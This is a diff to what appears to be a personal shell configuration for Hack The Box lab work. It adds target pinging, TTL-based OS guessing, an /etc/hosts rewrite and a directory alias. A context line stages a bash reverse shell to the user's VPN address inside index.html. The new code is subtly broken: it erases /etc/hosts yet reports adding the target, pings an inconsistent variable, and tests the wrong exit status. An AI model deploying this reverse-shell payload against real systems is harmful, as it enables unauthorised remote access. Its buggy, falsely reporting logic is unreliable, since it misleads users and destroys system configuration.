@@ -3,7 +3,7 @@
 if [[ $EUID -ne 0 ]]; then    
     PROMPT="%F{red}[%f%F{#00FFFF}$USER%f%F{red}]%f%F{red}[%f%F{lime}%d%f%F{red}]%f""%F{red}%(?..[%?])%f%F{#FFFF00}$ %f"
 else
-   PROMPT="%F{red}[%f%F{#000000}%K{#FF0000}$USER%f%k%F{red}]%f%F{red}[%f%F{#00FF00}%d%f%F{red}]%f""%F{red}%(?..[%?])%f%F{#FFFF00}$ %f"
+   PROMPT="%F{red}%f%F{#000000}%K{#FF0000}[$USER]%f%k%F{red}%f%F{red}[%f%F{#00FF00}%d%f%F{red}]%f""%F{red}%(?..[%?])%f%F{#FFFF00}$ %f"
 fi
  
 # Export PATH$
@@ -309,11 +309,40 @@ if [ "$IFACE" = "tun0" ]; then
   htb_ip=$(/usr/sbin/ifconfig | grep tun0 -A1 | grep inet | awk '{print $2}')
   echo -ne "\n\n\t${green}[+]${endcolor} Conexion con VPN establecida"
   echo -ne "\n\n\t${green}[+]${endcolor} Ip de Hack the box: ${blue}$(/usr/sbin/ifconfig tun0 | grep "inet " | awk '{print $2}')${endcolor}"
+  ttl="$(ping -c 1 $ip_target | grep ttl | tr '=' ' ' | awk '{print $8}')"
+  if [ $? = "1" ]; then
+    echo -e "\t${red}[!]${end} Host ${red}$ip_target${end} inactivo"
+    tput cnorm; exit 1
+  else
+    echo -e "\t${green}[+]${end} Host ${green}$ip_target${end} activo"
+  fi
+  
+  echo -e "$nombre_maquina" > /home/kermit/.config/bin/target_sys.txt
+
+  if [[ $ttl -le 64 ]]; then
+    echo -e "\n\t${blue}[+]${end} Sistema ${blue}Linux ${end}"
+    echo -e "linux" > /home/kermit/.config/bin/ttl.txt
+  fi
+  if [[ $ttl -le 128 && $ttl -gt 64 ]]; then
+    echo -e "\n\t${green}[+]${end} Sistema ${green}Windows ${end}"
+    echo -e "windows" > /home/kermit/.config/bin/ttl.txt
+  fi
   echo -ne "\n\n\t${green}[+]${endcolor} Ip target: ${red}$ip_address ${endcolor}"
  
   echo "$ip_address" > /home/kermit/.config/bin/target.txt
   echo "$nombre_maquina" > /home/kermit/.config/bin/name.txt
- 
+
+  echo "# Host addresses" > /etc/hosts
+  echo "#" >> /etc/hosts
+  echo "127.0.0.1  localhost" >> /etc/hosts
+  echo "127.0.1.1  parrot" >> /etc/hosts
+  echo -ne "\n\n\n" >> /etc/hosts
+  echo "::1        localhost ip6-localhost ip6-loopback" >> /etc/hosts
+  echo "ff02::1    ip6-allnodes" >> /etc/hosts
+  echo "ff02::2    ip6-allrouters" >> /etc/hosts
+  echo -e "\n\n\t${green}[+]${endcolor} Añadido ${blue}$nombre_maquina${endcolor} -> ${blue}$ip_address${endcolor} al /etc/hosts...\n"
+
+  
   echo -e "\n\n\t${green}[+]${endcolor} Creando directorios de trabajo...\n"
   mkdir /home/kermit/maquinas/$nombre_maquina
   mkdir /home/kermit/maquinas/$nombre_maquina/content
@@ -323,7 +352,8 @@ if [ "$IFACE" = "tun0" ]; then
   touch /home/kermit/maquinas/$nombre_maquina/index.html
   chmod o+x /home/kermit/maquinas/$nombre_maquina/index.html
   echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/$htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
-  cd /home/kermit/maquinas/$nombre_maquina
+  alias mach='cd /home/kermit/maquinas/$nombre_maquina'
+  mach
   echo "\n"
   lsd -la
   echo "\n\n"
